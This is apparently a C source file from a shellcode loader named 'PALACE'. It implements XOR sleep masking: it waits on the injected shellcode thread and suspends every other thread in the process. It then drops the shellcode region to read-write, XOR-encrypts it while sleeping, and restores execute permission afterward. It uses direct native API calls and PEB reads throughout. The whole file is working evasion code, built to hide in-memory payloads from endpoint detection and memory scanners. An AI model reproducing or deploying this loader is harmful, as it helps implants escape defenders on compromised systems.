/* XOR sleep masking. Default: plain infinite join (Go runtimes
 * must not mask: goroutines run concurrently and would fetch
 * encrypted instructions mid-mask).
 *
 * With PALACE_SLEEPMASK (native only, self mode): join the
 * shellcode thread with a bounded wait; while it still runs,
 * suspend every other thread in the process, XOR-mask the
 * shellcode region, sleep masked, then unmask and resume. A
 * suspended thread cannot execute, so masking is safe; any
 * failure unmasks and resumes immediately, then falls back to a
 * plain join. Tunables (ms) for tests: PALACE_JOIN_TIMEOUT_MS
 * (default 5000), PALACE_MASK_SLEEP_MS (default 30000). */
#include "loader.h"
#include "services.h"

#ifndef PALACE_JOIN_TIMEOUT_MS
#define PALACE_JOIN_TIMEOUT_MS 5000
#endif
#ifndef PALACE_MASK_SLEEP_MS
#define PALACE_MASK_SLEEP_MS 30000
#endif

void mask_region(void *addr, size_t len, const uint8_t *key, size_t keylen) {
    uint8_t *b = (uint8_t *)addr;
    if (!keylen)
        return;
    for (size_t i = 0; i < len; i++)
        b[i] ^= key[i % keylen];
}

#ifndef PALACE_SLEEPMASK

int masked_join(void *thread, void *region, size_t len, const uint8_t *key, size_t keylen, int *rounds) {
    (void)region;
    (void)len;
    (void)key;
    (void)keylen;
    if (rounds)
        *rounds = 0;
    _NtWaitForSingleObject(thread, 0, 0);
    return 1;
}

#else

static uint64_t current_pid(void) {
    uint64_t v;
    __asm__ volatile("movq %%gs:0x40, %0" : "=r"(v));
    return v;
}

static uint64_t current_tid(void) {
    uint64_t v;
    __asm__ volatile("movq %%gs:0x48, %0" : "=r"(v));
    return v;
}

#define MAX_SUSPENDED 128

/* Suspend every thread in this process except the caller. Returns
 * the count, or -1 on any failure (already resumed). */
static int suspend_others(HANDLE *out) {
    HANDLE snap = _CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
    if (snap == (HANDLE)(intptr_t)-1 || !snap)
        return -1;
    uint64_t pid = current_pid();
    uint64_t self = current_tid();
    THREADENTRY32 te;
    int n = 0;
    int ok = 0;
    te.dwSize = sizeof(te);
    if (_Thread32First(snap, &te)) {
        do {
            if (te.th32OwnerProcessID != (uint32_t)pid || te.th32ThreadID == (uint32_t)self)
                continue;
            if (n >= MAX_SUSPENDED)
                goto fail;
            HANDLE th = _OpenThread(THREAD_SUSPEND_RESUME, 0, te.th32ThreadID);
            if (!th)
                goto fail;
            ULONG prev = 0;
            if (!NT_SUCCESS(_NtSuspendThread(th, &prev))) {
                _CloseHandle(th);
                goto fail;
            }
            out[n++] = th;
        } while (_Thread32Next(snap, &te));
        ok = 1;
    } else {
        ok = 1; /* no threads enumerated: nothing to suspend */
    }
fail:
    _CloseHandle(snap);
    if (!ok) {
        for (int i = 0; i < n; i++) {
            ULONG c = 0;
            _NtResumeThread(out[i], &c);
            _CloseHandle(out[i]);
        }
        return -1;
    }
    return n;
}

static void resume_all(HANDLE *ths, int n) {
    for (int i = 0; i < n; i++) {
        ULONG c = 0;
        _NtResumeThread(ths[i], &c);
        _CloseHandle(ths[i]);
    }
}

int masked_join(void *thread, void *region, size_t len, const uint8_t *key, size_t keylen, int *rounds) {
    int nrounds = 0;
    for (;;) {
        LONGLONG wait = -(LONGLONG)(PALACE_JOIN_TIMEOUT_MS * 10000);
        NTSTATUS st = _NtWaitForSingleObject(thread, 0, &wait);
        if (st != STATUS_TIMEOUT) {
            if (rounds)
                *rounds = nrounds;
            return 1;
        }
        HANDLE suspended[MAX_SUSPENDED];
        int n = suspend_others(suspended);
        if (n < 0) {
            /* Fail-safe: plain join, payload stays executable. */
            _NtWaitForSingleObject(thread, 0, 0);
            if (rounds)
                *rounds = nrounds;
            return 1;
        }
        /* The region is RX: drop to RW (non-executable) for the
         * masked window, restore RX before resuming. */
        PVOID base = region;
        SIZE_T sz = len;
        ULONG old = 0;
        if (!NT_SUCCESS(_NtProtectVirtualMemory((HANDLE)(intptr_t)-1, &base, &sz, PAGE_READWRITE, &old))) {
            resume_all(suspended, n);
            _NtWaitForSingleObject(thread, 0, 0);
            if (rounds)
                *rounds = nrounds;
            return 1;
        }
        mask_region(region, len, key, keylen);
        LONGLONG sleep = -(LONGLONG)(PALACE_MASK_SLEEP_MS * 10000);
        _NtDelayExecution(0, &sleep);
        mask_region(region, len, key, keylen);
        base = region;
        sz = len;
        ULONG tmp = 0;
#ifdef PALACE_RWX
        _NtProtectVirtualMemory((HANDLE)(intptr_t)-1, &base, &sz, PAGE_EXECUTE_READWRITE, &tmp);
#else
        _NtProtectVirtualMemory((HANDLE)(intptr_t)-1, &base, &sz, PAGE_EXECUTE_READ, &tmp);
#endif
        resume_all(suspended, n);
        nrounds++;
    }
}

#endif
